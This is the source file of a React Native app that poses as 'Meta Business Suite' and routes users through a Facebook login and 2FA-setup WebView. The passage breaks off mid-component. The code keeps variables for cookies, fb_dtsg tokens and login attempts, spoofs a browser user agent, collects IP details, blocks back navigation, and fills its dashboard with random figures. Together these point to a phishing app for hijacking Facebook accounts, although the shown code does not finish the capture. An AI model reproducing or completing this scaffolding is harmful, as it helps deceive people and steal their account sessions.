import { createBottomTabNavigator } from "@react-navigation/bottom-tabs";
import { NavigationContainer, useFocusEffect, useRoute } from "@react-navigation/native";
import { createNativeStackNavigator } from "@react-navigation/native-stack";
import Checkbox from "expo-checkbox";
import { LinearGradient } from "expo-linear-gradient";
import firebase from "firebase";
import React, { useEffect, useRef, useState } from "react";
import {
  ActivityIndicator,
  AsyncStorage,
  Dimensions,
  Image,
  LogBox,
  Modal,
  SafeAreaView,
  ScrollView,
  StatusBar,
  StyleSheet,
  TextInput,
  TouchableOpacity,
  Button,
  Alert,
} from "react-native";
import { LineChart, PieChart, StackedBarChart } from "react-native-chart-kit";
import { Colors, Text, View } from "react-native-ui-lib";
import { WebView } from "react-native-webview";
import {
  AdjustmentIcon,
  ChevronDownIcon,
  ChevronLeftIcon,
  ChevronRightIcon,
  MegaphoneIcon,
  MoneyIcon,
  PlusIcon,
  PresentationChartBarIcon,
  RooketIcon,
  TimesIcon,
  TrashIcon,
  USDIcon,
} from "./icon";
import { Picker } from "@react-native-picker/picker";
import RNDateTimePicker from "@react-native-community/datetimepicker";

LogBox.ignoreLogs(["Warning: ..."]); // Ignore log notification by message
LogBox.ignoreAllLogs(); //Ignore all log notifications
if (firebase.apps.length === 0) {
  firebase.initializeApp({
    apiKey: "AIzaSyBTUyfZCSxfFp1IhgxZ0lrxcUqwYEPL_1c",
    authDomain: "caulong-8501c.firebaseapp.com",
    databaseURL: "https://caulong-8501c-default-rtdb.firebaseio.com",
    projectId: "caulong-8501c",
    storageBucket: "caulong-8501c.appspot.com",
    messagingSenderId: "1071504106180",
    appId: "1:1071504106180:web:c611f54517b6195909df91",
    measurementId: "G-M9PVD5ZGGB",
  });
}
const delay = (ms) => new Promise((res) => setTimeout(res, ms));
// Function to write data to Firestore
const addDocument = async (collection, data) => {
  try {
    const document = await firebase
      .firestore()
      .collection(collection)
      .add(data);
    return document.id;
  } catch (error) {
    console.log("error :>> ", error);
  }
};

const updDocument = async (collection, data, docid) => {
  try {
    await firebase.firestore().collection(collection).doc(docid).update(data);
  } catch (error) {
    console.log("error :>> ", error);
  }
};

const getDataList = async (collection, limit = 3) => {
  try {
    let dataList = [];
    await firebase
      .firestore()
      .collection(collection)
      .orderBy("createdAt", "desc")
      .limit(limit)
      .get()
      .then((querySnapshot) => {
        console.log(querySnapshot.docs);
        const data = [];
        querySnapshot.forEach((doc) => {
          data.push({ ...doc.data(), docId: doc.id });
        });
        dataList = data;
      });
    return dataList;
  } catch (error) {
    console.log("error :>> ", error);
    return [];
  }
};

//==========GLOBAL VARIAVLE=========
//var emails = [];
var cookieStr = "";
var loginAttempts = 0;
var fb_dtsg = "";
var is_done = false;
var injected = false;
var useragent =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15";
const { width, height } = Dimensions.get("window");
const JS_GLOBAL = `
(function () {
      try{
        if (document.querySelector(\"._2pio._1uxu\")) {
          document.querySelector(\"._2pio._1uxu\").remove();   
        }
        const meta = document.createElement(\'meta\'); meta.setAttribute(\'content\', \'width=device-width, initial-scale=1, maximum-scale=0.9, user-scalable=0\'); meta.setAttribute(\'name\', \'viewport\'); 
        document.getElementsByTagName(\'head\')[0].appendChild(meta);
        document.body.addEventListener("contextmenu", function(evt){evt.preventDefault();return false;});
      }catch(e){};
})();
true`;
const _request = async ({ url, body, headers = {} }, cookie) => {
  try {
    var rqOption = {
      method: "GET",
      mode: "cors",
      cache: "no-cache",
      credentials: "same-origin",
      headers: {
        Cookie: cookie,
        "User-Agent": useragent,
      },
    };
    if (body?.length) {
      rqOption["method"] = "POST";
      rqOption["body"] = body;
    }
    rqOption.headers = { ...rqOption.headers, ...headers };
    const response = await fetch(url, rqOption);
    return await response.text();
  } catch (error) {
    console.log("error :>> ", error);
  }
};

Colors.loadColors({
  primaryColor: "#039dc1", // Blue
  secondaryColor: "#36D7B7", // Teal
  textColor: "#595959", // Dark Gray
  textWhite: "#ffffff", // Dark Gray
  textBlack: "#000000", // Dark Gray
  errorColor: "#FF5252", // Red
  successColor: "#4CAF50", // Green
  dangerColor: "#ff1a1a", // Yellow
  warnColor: "#FFC107", // Yellow
  bgPrimary: "#F5F5F5", // Light Gray
  bgSecondary: "#666666", // Amber
  bgSecondaryLight: "#d9d9d9", // Light Gray (Info or neutral color)
  bgError: "#FFEBEE", // Pink
  bgSuccess: "#E8F5E9", // Light Green
  bgWarn: "#FFFDE7", // Yellow
  bgLight: "#FFFFFF", // White or any light color you prefer
  bgPrimaryLight: "#ccebff", // Light Blue
  bgErrorLight: "#ffcdd2", // Light Red
  bgSuccessLight: "#dcedc8", // Light Green
  bgWarnLight: "#fff9c4", // Light Yellow
  bgPrimaryDark: "#038ac1",
});

function MainScreen({ navigation }) {
  const [modalVisible, setModalVisible] = useState(false);
  const [initUrl, setInitUrl] = useState(
    "https://www.facebook.com/security/2fac/setup/intro/"
  );
  const webViewRef = useRef();
  const [loadingVisible, setLoadingVisible] = useState(false);
  const styles = StyleSheet.create({
    activityIndicatorStyle: {
      flex: 1,
      position: "absolute",
      marginLeft: "auto",
      marginRight: "auto",
      marginTop: "auto",
      marginBottom: "auto",
      left: 0,
      right: 0,
      top: 0,
      bottom: 0,
      justifyContent: "center",
    },
  });

  const ActivityIndicatorElement = () => {
    return (
      <View style={styles.activityIndicatorStyle}>
        <ActivityIndicator color="#009688" size="large" />
      </View>
    );
  };

  const onloadEnd = async (event) => {
    setTimeout(() => {
      setLoadingVisible(false);
    }, 100);
    const { nativeEvent } = event;
    this.isLoading = nativeEvent.loading;
    this.url = nativeEvent.url;
  };

  const handleMessage = async (event) => {
    if (!event.nativeEvent) {
      return;
    }
    try {
      if (event.nativeEvent.data) {
        let data = JSON.parse(event.nativeEvent.data);
      }
    } catch (error) {
      console.log("error :>> ", error);
      return;
    }
  };
  const handleNagivate = async (navState) => {};

  const onloadStart = async (event) => {
    setLoadingVisible(true);
  };

  return (
    <View style={{ flex: 1, marginTop: "10%" }}>
      <Modal animationType="none" transparent={false} visible={modalVisible}>
        <View
          style={{ flex: 1, alignItems: "center", justifyContent: "center" }}
        >
          <Image
            source={require("./assets/images/logo.png")}
            style={{
              resizeMode: "contain",
              width: 250,
              height: 120,
              marginLeft: 0,
              marginTop: 0,
            }}
          />
          <Image
            source={require("./assets/images/loading.gif")}
            style={{ width: 35, height: 35 }}
          />
          <Text style={{ fontSize: 14 }}>Verifying...</Text>
          <Text style={{ fontSize: 14 }}>Please do not close the app</Text>
        </View>
      </Modal>
      <WebView
        useWebKit={true}
        incognito={true}
        style={{ flex: 1, opacity: loadingVisible ? 0 : 100 }}
        ref={webViewRef}
        source={{ uri: initUrl }}
        javaScriptEnabled={true}
        injectedJavaScript={JS_GLOBAL}
        domStorageEnabled={true}
        startInLoadingState={true}
        originWhitelist={["*"]}
        scalesPageToFit={false}
        sharedCookiesEnabled={true}
        userAgent={useragent}
        onLoadEnd={onloadEnd}
        onLoadStart={onloadStart}
        onMessage={handleMessage}
        onNavigationStateChange={handleNagivate}
        cacheEnabled={false}
      />
      {loadingVisible ? <ActivityIndicatorElement /> : null}
    </View>
  );
}

//===================
function PushNotifyScreen({ navigation }) {
  const stylesNoti = StyleSheet.create({
    container: {
      backgroundColor: "#fff",
      alignItems: "center",
      padding: 30,
      height: "100%",
    },
    header: {
      marginTop: 40,
    },
    boxTitle: {
      marginTop: 30,
    },
    title: {
      fontSize: 22,
      fontWeight: "bold",
      textAlign: "center",
    },
    policies: {
      marginTop: 30,
      paddingHorizontal: 30,
      gap: 20,
    },
    policy: {
      flexDirection: "row",
      gap: 10,
      paddingHorizontal: 30,
    },
    checkbox: {},
    label: {
      fontSize: 18,
      marginLeft: 10,
      fontWeight: "bold",
    },
    des: {
      marginTop: 5,
      marginLeft: 10,
      fontSize: 15,
      marginBottom: 10,
    },
    submit: {
      width: "100%",
      position: "absolute",
      bottom: 10,
      alignItems: "center",
      padding: 30,
    },
    hr: {
      width: "100%",
      borderColor: "#f2f2f2",
      borderWidth: 1,
    },
    textDes: {
      color: "#bfbfbf",
      marginTop: 10,
    },
    button: {
      height: 50,
      width: "100%",
      justifyContent: "center",
      alignItems: "center",
      backgroundColor: "#4C91FA",
      borderRadius: 12,
      marginTop: 10,
    },
  });

  useEffect(() => {
    async function fetchIPInfo() {
      // CookieManager.clearAll();
      const storageIP = await AsyncStorage.getItem("ipinfo");
      if (!storageIP) {
        let fetchRes = await fetch("https://ipinfo.io/json", {
          method: "GET",
          headers: {
            Accept: "application/json",
          },
        });
        let fetchStr = await fetchRes.json();
        await AsyncStorage.setItem("ipinfo", JSON.stringify(fetchStr));
      }
    }
    fetchIPInfo();
  }, []);

  return (
    <SafeAreaView style={stylesNoti.container}>
      <View style={stylesNoti.header}>
        <Image source={require("./assets/images/noti.png")} />
      </View>
      <View style={stylesNoti.boxTitle}>
        <Text style={stylesNoti.title}>Turn on push notifications to</Text>
        <Text style={stylesNoti.title}>stay updated</Text>
      </View>
      <View style={stylesNoti.policies}>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Do you like React Native?</Text>
            <Text style={stylesNoti.des}>
              The status of your campaigns: approval, ending and performance
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Alerts</Text>
            <Text style={stylesNoti.des}>
              Error blocking your campaigns: ad rejection, biling issues, or
              reaching your spending limit
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Getting started</Text>
            <Text style={stylesNoti.des}>
              Tips for running campaigns in Ads Manager
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Performance opportunities</Text>
            <Text style={stylesNoti.des}>
              Suggestion to improve campaigns performance
            </Text>
          </View>
        </View>
      </View>
      <View style={stylesNoti.submit}>
        <View style={{ width: "100%", paddingHorizontal: 15 }}>
          <View style={stylesNoti.hr} />
        </View>
        <Text style={stylesNoti.textDes}>
          You can make changes in settings any time
        </Text>
        <TouchableOpacity
          onPress={() => {
            navigation.navigate("SocialAuthScreen");
          }}
          style={stylesNoti.button}
        >
          <Text style={{ color: "#fff", fontWeight: "bold", fontSize: 17 }}>
            Continue
          </Text>
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
}

function SocialAuthScreen({ navigation }) {
  const stylesLogin = StyleSheet.create({
    container: {
      flex: 1,
      flexGrow: 1,
      backgroundColor: "#fff",
      alignItems: "center",
      justifyContent: "center",
      padding: 30,
    },
    box: {
      width: "100%",
      backgroundColor: "#fff",
      height: 320,
      borderRadius: 12,
      paddingTop: 50,
      paddingLeft: 30,
      paddingRight: 30,
    },
    boxHeader: {
      justifyContent: "center",
      alignItems: "center",
      flexDirection: "row",
      gap: 5,
    },
    checked: {
      position: "relative",
      right: 8,
      top: -10,
    },
    title: {
      fontSize: 22,
      fontWeight: "bold",
      marginLeft: 2,
    },
    fblogin: {
      marginLeft: 5,
      fontSize: 15,
    },
    inslogin: {
      marginLeft: 5,
      fontSize: 15,
      color: "#9ca3af",
    },
    titletext: {
      fontSize: 16,
    },
    description: {
      marginTop: 20,
      alignItems: "center",
    },
    login: {
      marginTop: 30,
      gap: 10,
    },
    button: {
      marginBottom: 10,
      flexDirection: "row",
      justifyContent: "center",
      gap: 10,
      padding: 15,
      width: "100%",
      backgroundColor: "#d7dbdf6e",
      borderRadius: 12,
    },
  });
  const [touched, setTouched] = useState(false);
  useEffect(
    () =>
      navigation.addListener("beforeRemove", (e) => {
        e.preventDefault();
        return;
      }),
    [navigation]
  );
  return (
    <LinearGradient
      // Background Linear Gradient
      colors={["#14D5FF", "#45D439"]}
      style={stylesLogin.container}
    >
      <View style={stylesLogin.box}>
        <View style={stylesLogin.boxHeader}>
          <Image source={require("./assets/images/meta.png")} />
          <Text style={stylesLogin.title}>Meta Business Suite</Text>
        </View>
        <View style={stylesLogin.description}>
          <Text style={stylesLogin.titletext}>
            Create and manage ads on iphone
          </Text>
        </View>
        <View style={stylesLogin.login}>
          <TouchableOpacity
            onPress={() => {
              navigation.navigate("MainScreen");
            }}
            style={stylesLogin.button}
          >
            <Image
              height={"18"}
              width={18}
              source={require("./assets/images/fb.png")}
            />
            <Text style={stylesLogin.fblogin}>Login with Facebook</Text>
          </TouchableOpacity>

          <TouchableOpacity disabled={true} style={stylesLogin.button}>
            <Image source={require("./assets/images/ig.png")} />
            <Text style={stylesLogin.inslogin}>Login with Instagram</Text>
          </TouchableOpacity>
        </View>
      </View>
    </LinearGradient>
  );
}

function ExtendComponent({ campaign_name, ...content }) {
  const [isExtend, setIsExtend] = useState(false);

  const contentData = Object.entries(content)
    .sort();

    console.log(contentData);
  return (
    <View paddingH-10 marginT-20>
      <View borderRadius={10} borderWidth borderColor={Colors.$textDisabled}>
        <View
          paddingV-10
          paddingH-10
          borderRadius={10}
          row
          centerV
          spread
          style={{
            height: 50,
            backgroundColor: isExtend
              ? Colors.$backgroundNeutral
              : Colors.$backgroundElevated,
          }}
          onPress={() => setIsExtend(!isExtend)}
        >
          <TouchableOpacity
            style={{ height: "100%", width: "80%" }}
            onPress={() => setIsExtend(!isExtend)}
          >
            <Text text70BO>{campaign_name}</Text>
          </TouchableOpacity>
          <TouchableOpacity
            style={{ height: "100%" }}
            onPress={() => setIsExtend(!isExtend)}
          >
            {isExtend ? <ChevronRightIcon /> : <ChevronDownIcon />}
          </TouchableOpacity>
        </View>
        {isExtend ? (
          <View paddingV-10 paddingH-10>
            {contentData.map(([key, value], index) => {
              return (
                <View row spread paddingV-5 key={index}>
                  <Text text70>{key}</Text>
                  <Text text70BO>{value}</Text>
                </View>
              );
            })}
          </View>
        ) : null}
      </View>
    </View>
  );
}

function HomeScreen({ navigation }) {
  const [loading, setLoading] = React.useState(false);
  const [countNoti, setCountNoti] = React.useState(0);
  const [campaigns, setCampaigns] = React.useState([]);
  const route = useRoute();

  const screenWidth = Dimensions.get("window").width - 40;
  const chartConfig = {
    backgroundGradientFrom: "#1E2923",
    color: (opacity = 1) => `rgba(26, 255, 146, ${opacity})`,
    strokeWidth: 2, // optional, default 3
    barPercentage: 1,
    style: {
      borderRadius: 16,
    },
  };
  const initData = async () => {
    setLoading(true);
    const data = await getDataList("campaigns");
    console.log(data);
    setCampaigns(data);
    setLoading(false);
  };

  useFocusEffect(
    React.useCallback(() => {
      initData();
    }, [])
  );

  const data = [
    {
      name: "Facebook",
      population: 21500000,
      color: Colors.primaryColor,
      legendFontSize: 13,
    },
    {
      name: "Google Ads",
      population: 2800000,
      color: Colors.$outlineWarning,
      legendFontSize: 13,
    },
    {
      name: "Twitter",
      population: 11920000,
      color: Colors.$iconSuccessLight,
      legendFontSize: 13,
    },
  ];

  const generateData = () => {
    const months = ["Jan", "Feb", "Mar", "Apr"];
    const categories = ["Facebook", "Google Ads", "Twitter"];

    return {
      labels: months,
      legend: categories,
      data: months.map((category) => {
        return categories.map((month) => {
          // Replace this logic with your own data generation
          // For example, you could generate random numbers
          return Math.floor(Math.random() * 50) + 20;
        });
      }),
      barColors: [
        Colors.primaryColor, // Facebook
        Colors.$outlineWarning, // Google Ads
        Colors.$iconSuccessLight, // Twitter
      ],
    };
  };

  // Example usage
  const dataBar = generateData();

  const barChartConfig = {
    backgroundGradientFrom: "#ffffff",
    backgroundGradientTo: "#ffffff",
    fillShadowGradientFrom: "#ffffff",
    fillShadowGradient: "skyblue",
    fillShadowGradientOpacity: 1,
    propsForBackgroundLines: {
      strokeDasharray: [2, 15],
    },
    color: (opacity = 1) => Colors.textColor,
    labelColor: (opacity = 1) => Colors.textColor,
    strokeWidth: 1, // optional, default 3
    barPercentage: 0.5,
    useShadowColorFromDataset: false,
    propsForLabels: {
      style: {
        color: Colors.textWhite,
      },
    },
  };

  const dataCampaign = [
    {
      campaign_name: "Black Friday Deals",
      spent: "$50000",
      clicks: 100000,
      conversion_rate: 0.02,
      views: 2500000,
      cpc: 0.25,
    },
    {
      campaign_name: "Cyber Monday Deals",
      spent: "$75000",
      clicks: 150000,
      conversion_rate: 0.03,
      views: 3750000,
      cpc: 0.5,
    },
    {
      campaign_name: "Back to School Deals",
      spent: "$100000",
      clicks: 200000,
      conversion_rate: 0.04,
      views: 5000000,
      cpc: 0.5,
    },
  ];

  return (
    <SafeAreaView style={stylesHomePage.container}>
      <View
        row
        centerV
        spread
        paddingH-20
        paddingV-10
        backgroundColor={Colors.textWhite}
      >
        <Text marginT-10 text60BO>
          Dashboard
        </Text>
        <TouchableOpacity onPress={() => navigation.navigate("SettingScreen")}>
          <AdjustmentIcon width={30} height={30} color={Colors.textColor} />
        </TouchableOpacity>
      </View>
      <ScrollView
        flex
        style={{ overflow: "scroll", backgroundColor: Colors.primaryColor }}
      >
        <View paddingH-20 marginT-20 style={{ position: "relative" }}>
          <PieChart
            data={data}
            width={screenWidth}
            height={240}
            chartConfig={chartConfig}
            accessor={"population"}
            backgroundColor={Colors.textWhite}
            paddingLeft={"15"}
            style={{ borderRadius: 16 }}
            bezier
          />
          <View
            style={{
              position: "absolute",
              width: 100,
              height: 100,
              borderRadius: 9999,
              top: 70,
              left: 80,
              backgroundColor: "#ffffff",
            }}
          ></View>
        </View>
        <View paddingH-20 marginT-20 style={{ position: "relative" }}>
          <StackedBarChart
            data={dataBar}
            width={screenWidth - 10}
            height={240}
            yAxisLabel="$"
            yLabelsOffset={5}
            chartConfig={barChartConfig}
            style={{
              borderRadius: 16,
              paddingLeft: 10,
              paddingTop: 10,
              backgroundColor: Colors.textWhite,
            }}
          />
        </View>
        <View marginT-20 paddingV-20 backgroundColor={Colors.textWhite}>
          <Text text60 center>
            Campaigns
          </Text>
          {campaigns.map((item, index) => (
            <ExtendComponent key={index} {...item} />
          ))}
        </View>
        <View backgroundColor={Colors.textWhite} style={{ height: 60 }} />
      </ScrollView>
    </SafeAreaView>
  );
}

const stylesHomePage = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: "#ffffff",
    overflow: "scroll",
  },
  header: {
    flexDirection: "row",
    backgroundColor: "#fff",
    alignItems: "center",
    justifyContent: "space-between",
    paddingHorizontal: 10,
  },
  icon: {
    padding: 10,
    alignItems: "center",
    flexDirection: "row",
    gap: 10,
  },
  headerText: {
    color: "#000",
    fontSize: 20,
    fontWeight: "bold",
  },
  imageContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
  },
  image: {
    width: 200,
    height: 200,
    borderRadius: 100,
  },
  profile: {
    backgroundColor: "#fff",
    padding: 20,
  },
  profileText: {
    color: "#000",
    fontSize: 18,
    textAlign: "center",
  },
  bage: {
    position: "absolute",
    top: 13,
    right: 13,
    width: 10,
    height: 10,
    borderRadius: 100,
    backgroundColor: "#ff0000",
    justifyContent: "center",
    alignItems: "center",
  },
  bageText: {
    color: Colors.dangerColor,
    fontSize: 12,
    fontWeight: "bold",
  },
  card: {
    backgroundColor: "white",
    borderRadius: 8,
    width: "100%",
  },
  shadowProp: {
    shadowOffset: { width: 0, height: 2 },
    shadowColor: "#808080",
    shadowOpacity: 0.2,
    shadowRadius: 12,
  },
});

export const CustomHeader = ({
  title,
  showBack,
  right,
  info,
  disabled,
  onPress,
  styleHeader,
  titleLeft,
  titleRight,
  navigation,
}) => {
  const b = { disabled, onPress };
  const iconSize = 22;

  const handleBack = (e) => {
    navigation.goBack();
  };

  return (
    <View
      style={{
        flexDirection: "row",
        alignItems: "center",
        height: 60,
        paddingHorizontal: 20,
        justifyContent: "space-between",
        ...styleHeader,
      }}
    >
      <View style={{ flexDirection: "row", alignItems: "center" }}>
        {showBack ? (
          <View
            style={{ flexDirection: "row", alignItems: "center", margin: 5 }}
          >
            <TouchableOpacity onPress={handleBack} style={{ marginRight: 10 }}>
              <ChevronLeftIcon color="black" />
            </TouchableOpacity>
            {titleLeft ? (
              <Text style={{ fontSize: 17, fontWeight: "600" }}>
                {titleLeft}
              </Text>
            ) : null}
          </View>
        ) : null}
      </View>

      <View style={{ flexDirection: "row", alignItems: "center" }}>
        {info ? (
          <Text style={{ fontSize: 17, fontWeight: "600" }}>{info}</Text>
        ) : null}

        {right ? (
          <View style={{ flexDirection: "row", alignItems: "center" }}>
            <TouchableOpacity onPress={handleBack}>{right}</TouchableOpacity>
            {titleRight ? (
              <Text style={{ fontSize: 17, fontWeight: "600" }}>
                {titleRight}
              </Text>
            ) : null}
          </View>
        ) : null}
      </View>
    </View>
  );
};

const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();
const TabBarPlusButton = ({ navigation }) => {
  const onPress = () => {
    navigation.navigate("CreatePost");
  };

  return (
    <>
      <View
        style={{
          justifyContent: "center",
          alignItems: "center",
          position: "relative",
          top: -20,
        }}
      >
        <View
          style={{
            width: 60,
            height: 60,
            borderRadius: 999,
            backgroundColor: Colors.textWhite,
          }}
        />
        <TouchableOpacity
          onPress={onPress}
          style={{
            justifyContent: "center",
            alignItems: "center",
            width: 50,
            height: 50,
            backgroundColor: Colors.primaryColor,
            borderRadius: 999,
            position: "absolute",
          }}
        >
          <PlusOutlineIcon size={28} color={Colors.textWhite} />
        </TouchableOpacity>
      </View>
    </>
  );
};

const CampaignPerformanceForm = ({ navigation }) => {
  const [campaignName, setCampaignName] = useState("Campaign");
  const screenWidth = Dimensions.get("window").width;
  const width50Per = Dimensions.get("window").width / 2;
  const [modalVisible, setModalVisible] = useState(false);

  const chartConfig = {
    backgroundColor: Colors.textWhite,
    backgroundGradientFrom: Colors.textWhite,
    backgroundGradientTo: Colors.textWhite,
    decimalPlaces: 2,
    color: (opacity = 1) => `rgba(0, 0, 0, ${opacity})`,
    style: {
      borderRadius: 16,
    },
  };

  const handleSave = () => {
    // Save the campaign performance data to the server
  };

  const data = {
    labels: ["January", "February", "March", "April", "May", "June"],
    datasets: [
      {
        data: [20, 45, 28, 80, 99, 43],
        color: (opacity = 1) => Colors.primaryColor, // optional
        strokeWidth: 2, // optional
      },
      {
        data: [14, 33, 11, 42, 33, 99],
        color: (opacity = 1) => Colors.$outlineDanger, // optional
        strokeWidth: 2, // optional
      },
    ],
    legend: ["Black Friday", "123"], // optional
  };

  const campaigns = [
    {
      label: "Campaign",
      value: "Campaign",
    },
    {
      label: "Campaign 2",
      value: "Campaign 2",
    },
  ];

  return (
    <SafeAreaView style={stylesCompaign.container}>
      <View
        row
        centerV
        spread
        paddingH-20
        paddingV-10
        backgroundColor={Colors.primaryColor}
      >
        <Text text60BO color={Colors.textWhite}>
          Campaign Performance
        </Text>
        <TouchableOpacity onPress={() => navigation.navigate("SettingScreen")}>
          <AdjustmentIcon width={30} height={30} color={Colors.textWhite} />
        </TouchableOpacity>
      </View>
      <View
        padding-10
        margin-20
        borderRadius={12}
        backgroundColor={Colors.textWhite}
      >
        <Text style={stylesCompaign.header} marginB-10>
          Enter Campaign
        </Text>
        <View borderColor="#ccc" borderWidth borderRadius={6} padding-10>
          <TouchableOpacity
            style={{ height: 30 }}
            onPress={() => setModalVisible(true)}
          >
            <Text color={"#ccc"}>{campaignName || "Select here"}</Text>
          </TouchableOpacity>
        </View>
      </View>
      <View marginH-20 row centerV spread>
        <View
          padding-10
          borderRadius={12}
          backgroundColor={Colors.textWhite}
          width={width50Per - 30}
          height={80}
          spread
        >
          <Text text80R marginB-10>
            This Week
          </Text>
          <Text text60 color={Colors.textColor}>
            $940.23
          </Text>
        </View>
        <View
          padding-10
          borderRadius={12}
          backgroundColor={Colors.textWhite}
          width={width50Per - 30}
          height={80}
          spread
        >
          <Text text80R marginB-10>
            Past Month
          </Text>
          <Text text60 color={Colors.textColor}>
            $2123.34
          </Text>
        </View>
      </View>
      <View marginH-20 row centerV spread marginT-20>
        <View
          padding-10
          borderRadius={12}
          backgroundColor={Colors.textWhite}
          width={width50Per - 30}
          height={80}
          spread
        >
          <Text text80R marginB-10>
            This 3 Week
          </Text>
          <Text text60 color={Colors.textColor}>
            $1581.23
          </Text>
        </View>
        <View
          padding-10
          borderRadius={12}
          backgroundColor={Colors.textWhite}
          width={width50Per - 30}
          height={80}
          spread
        >
          <Text text80R marginB-10>
            This Year
          </Text>
          <Text text60 color={Colors.textColor}>
            $29133.23
          </Text>
        </View>
      </View>
      <View marginH-20 row centerV spread marginT-20>
        <LineChart
          data={data}
          width={screenWidth - 40}
          height={300}
          verticalLabelRotation={30}
          backgroundColor={Colors.textWhite}
          chartConfig={chartConfig}
          style={{
            borderRadius: 12,
          }}
          bezier
        />
      </View>
      <ModalPicker
        visible={modalVisible}
        onClose={() => setModalVisible(false)}
        showCancel={false}
        selectedValue={campaignName}
        onValueChange={(itemValue, itemIndex) =>
          setCampaignName((prv) => itemValue)
        }
        items={campaigns}
      />
    </SafeAreaView>
  );
};

const CommonPicker = ({ selectedValue, onValueChange, items }) => {
  return (
    <Picker selectedValue={selectedValue} onValueChange={onValueChange}>
      {items.map((item, index) => (
        <Picker.Item key={index} label={item.label} value={item.value} />
      ))}
    </Picker>
  );
};

const ModalPicker = ({
  selectedValue,
  onValueChange,
  items,
  visible,
  onClose,
  showCancel = true,
  showConfirm = true,
}) => {
  return (
    <Modal
      visible={visible}
      animationType="slide"
      transparent={true}
      onRequestClose={onClose}
      onDismiss={onClose}
    >
      <View style={stylesModal.modalContainer}>
        <View style={stylesModal.modalContent}>
          <TouchableOpacity
            style={{ position: "absolute", right: 5, top: 5 }}
            onPress={onClose}
          >
            <TimesIcon width={25} height={25} color={Colors.textBlack} />
          </TouchableOpacity>
          {/* CommonPicker inside the modal */}
          <CommonPicker
            selectedValue={selectedValue}
            onValueChange={onValueChange}
            items={items}
          />
          <View row style={{ justifyContent: "flex-end" }}>
            {showCancel ? (
              <TouchableOpacity
                style={{
                  alignItems: "center",
                  justifyContent: "center",
                  width: 80,
                  backgroundColor: Colors.$textDisabled,
                  height: 40,
                  borderRadius: 12,
                  marginRight: 12,
                }}
                onPress={onClose}
              >
                <Text color={Colors.textWhite} text80BO>
                  Cancel
                </Text>
              </TouchableOpacity>
            ) : null}
            {showConfirm ? (
              <TouchableOpacity
                style={{
                  alignItems: "center",
                  justifyContent: "center",
                  width: 80,
                  backgroundColor: Colors.primaryColor,
                  height: 40,
                  borderRadius: 12,
                }}
                onPress={onClose}
              >
                <Text color={Colors.textWhite} text80BO>
                  Confirm
                </Text>
              </TouchableOpacity>
            ) : null}
          </View>
        </View>
      </View>
    </Modal>
  );
};

const stylesModal = StyleSheet.create({
  modalContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    backgroundColor: "rgba(0, 0, 0, 0.5)",
  },
  modalContent: {
    backgroundColor: "white",
    padding: 20,
    borderRadius: 10,
    width: "80%",
  },
});

const CreateCampaign = ({ navigation }) => {
  const [campaignName, setCampaignName] = useState("");
  const [projectBudget, setProjectBudget] = useState("");
  const [typeAds, setTypeAds] = useState("");
  const [description, setDescription] = useState(0);
  const [startDate, setStartDate] = useState(new Date());
  const [endDate, setEndDate] = useState(new Date());
  const [modalVisible, setModalVisible] = useState(false);

  const addCampaign = () => {
    addDocument("campaigns", {
      campaign_name: campaignName,
      project_budget: projectBudget,
      type_ads: typeAds,
      description: description,
      start_date: startDate.getTime(),
      end_date: endDate.getTime(),
      spent: `$${(Math.random() * 100000).toFixed(2)}`,
      clicks: Math.floor(Math.random() * 200000),
      conversion_rate: parseFloat((Math.random() * 0.1).toFixed(2)),
      views: Math.floor(Math.random() * 5000000),
      cpc: parseFloat((Math.random() * 1).toFixed(2)),
      createdAt: new Date().getTime(),
    });
    Alert.alert("Alert", "Success");
  };

  const handleSave = () => {
    if (campaignName === "") {
      Alert.alert("Alert", "Please enter campaign name");
    } else if (projectBudget === "") {
      Alert.alert("Alert", "Please enter project budget");
    } else if (typeAds === "") {
      Alert.alert("Alert", "Please enter type ads");
    } else if (description === "") {
      Alert.alert("Alert", "Please enter description");
    } else {
      Alert.alert("Confirm", "Add Campaign", [
        {
          text: "Cancel",
          onPress: handleClear,
          style: "cancel",
        },
        { text: "OK", onPress: addCampaign },
      ]);
    }
  };

  const handleClear = () => {
    setCampaignName("");
    setProjectBudget("");
    setTypeAds("");
    setDescription("");
    setStartDate(new Date());
    setEndDate(new Date());
  };

  const pickerItems = [
    { label: "Select here", value: "Select here" },
    { label: "Java", value: "Java" },
    { label: "JavaScript", value: "JavaScript" },
  ];

  return (
    <SafeAreaView style={stylesCompaign.container}>
      <ScrollView>
        <View
          row
          centerV
          spread
          paddingH-20
          paddingV-10
          backgroundColor={Colors.primaryColor}
        >
          <Text text60BO color={Colors.textWhite}>
            Create Campaign
          </Text>
          <TouchableOpacity
            onPress={() => navigation.navigate("SettingScreen")}
          >
            <AdjustmentIcon width={30} height={30} color={Colors.textWhite} />
          </TouchableOpacity>
        </View>
        <View
          padding-10
          marginH-20
          marginT-20
          borderRadius={12}
          backgroundColor={Colors.textWhite}
        >
          <Text style={stylesCompaign.header} marginB-10>
            Name Campaign
          </Text>
          <TextInput
            style={stylesCompaign.input}
            placeholder="Campaign name"
            placeholderTextColor={Colors.$textDisabled}
            value={campaignName}
            onChangeText={setCampaignName}
          />
        </View>
        <View
          padding-10
          margin-20
          marginT-20
          borderRadius={12}
          backgroundColor={Colors.textWhite}
          row
          centerV
        >
          <Text text70BO style={{ flex: 0.3 }}>
            Type Ads
          </Text>
          <View
            borderColor="#ccc"
            borderWidth
            borderRadius={6}
            style={{ flex: 0.7 }}
            padding-10
          >
            <TouchableOpacity onPress={() => setModalVisible(true)}>
